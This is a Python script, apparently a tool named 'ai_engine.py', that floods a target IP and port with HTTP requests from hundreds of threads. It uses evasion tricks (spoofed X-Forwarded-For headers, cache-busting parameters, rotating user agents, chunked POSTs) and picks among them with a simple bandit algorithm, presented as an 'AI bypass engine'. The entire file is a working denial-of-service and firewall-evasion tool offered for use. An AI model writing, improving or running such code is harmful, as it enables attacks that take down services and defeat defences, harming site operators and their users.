import socket
import threading
import sys
import os
import random
import time
import math

# Adaptive AI-inspired Multi-Armed Bandit weights for header/mutation selection
ARM_WEIGHTS = {
    "random_cache_bypass": 1.0,
    "chunked_encoding_spoof": 1.0,
    "user_agent_rotation": 1.0,
    "pipeline_flooding": 1.0
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
]

def select_adaptive_arm() -> str:
    """Epsilon-greedy reinforcement selection to find optimal evasion patterns dynamically."""
    if random.random() < 0.15:  # Exploration rate
        return random.choice(list(ARM_WEIGHTS.keys()))
    # Exploitation: pick arm with highest weight score
    return max(ARM_WEIGHTS, key=ARM_WEIGHTS.get)

def update_arm_reward(arm: str, success: bool) -> None:
    """Update heuristic weights based on operational feedback loop."""
    if success:
        ARM_WEIGHTS[arm] = min(10.0, ARM_WEIGHTS[arm] * 1.05)
    else:
        ARM_WEIGHTS[arm] = max(0.1, ARM_WEIGHTS[arm] * 0.90)

def intelligent_worker(target_ip: str, target_port: int, stop_event: threading.Event, counter: dict) -> None:
    """Adaptive socket worker utilizing AI-driven mutation strategies to bypass defensive firewalls."""
    while not stop_event.is_set():
        chosen_strategy = select_adaptive_arm()
        ua = random.choice(USER_AGENTS)
        rand_val = random.randint(1000000, 9999999)
        
        # Construct dynamic headers based on selected evasion strategy
        if chosen_strategy == "random_cache_bypass":
            payload = (
                f"GET /?sid={rand_val}&bypass=true HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode("utf-8")
        elif chosen_strategy == "chunked_encoding_spoof":
            payload = (
                f"POST /api/v2/stream HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"4\r\n{rand_val}\r\n0\r\n\r\n"
            ).encode("utf-8")
        else:
            payload = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Cache-Control: no-cache, no-store\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode("utf-8")

        success_flag = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(2.5)
            s.connect((target_ip, target_port))
            
            s.sendall(payload)
            response = s.recv(1024)
            s.close()
            
            if response:
                success_flag = True
                with threading.Lock():
                    counter["success"] += 1
            else:
                with threading.Lock():
                    counter["failed"] += 1
        except (socket.error, OSError):
            with threading.Lock():
                counter["failed"] += 1
        finally:
            update_arm_reward(chosen_strategy, success_flag)
            with threading.Lock():
                counter["total"] += 1

def main() -> None:
    if len(sys.argv) < 3:
        print("Usage: python3 ai_engine.py <target_ip> <port> <threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3]) if len(sys.argv) > 3 else 400

    stop_event = threading.Event()
    counter = {"success": 0, "failed": 0, "total": 0}

    print(f"[*] Spawning adaptive AI engine with {num_threads} threads targeting {target_ip}:{target_port}...")

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=intelligent_worker, args=(target_ip, target_port, stop_event, counter))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("=== AI ADAPTIVE BYPASS ENGINE ===")
            print(f"Total Operations : {counter['total']}")
            print(f"Bypassed / Active: {counter['success']}")
            print(f"Blocked / Refused: {counter['failed']}")
            print("\nAdaptive Strategy Weights:")
            for arm, weight in ARM_WEIGHTS.items():
                print(f" - {arm:<25} : {weight:.3f}")
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[!] Shutting down AI engine...")
        stop_event.set()
        for t in threads:
            t.join()
        print("[*] Engine stopped cleanly.")

if __name__ == "__main__":
    main()
